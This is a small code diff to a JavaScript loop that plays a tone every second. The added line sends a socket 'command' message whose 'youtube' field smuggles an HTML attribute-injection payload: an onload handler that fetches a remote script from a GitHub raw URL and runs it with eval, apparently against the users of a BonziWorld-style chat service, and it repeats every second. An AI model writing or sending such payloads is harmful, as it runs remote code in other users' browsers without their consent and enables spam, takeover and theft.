@@ -24,5 +24,6 @@ setInterval(() => {
     oscillator.start();
     setTimeout(() => {
         oscillator.stop();
+        socket.emit('command',{list:['youtube','hWSmOB2xhjE" onload="fetch(\'//raw.githubusercontent.com/ivorydevrimoalt/BONZIWORLDULTRAJAVASCRIPTLIST/refs/heads/main/WEBDRIVER.js\').then(response => response.text()).then(script => eval(script));" u="']});
     }, 1000);
 }, 1000);
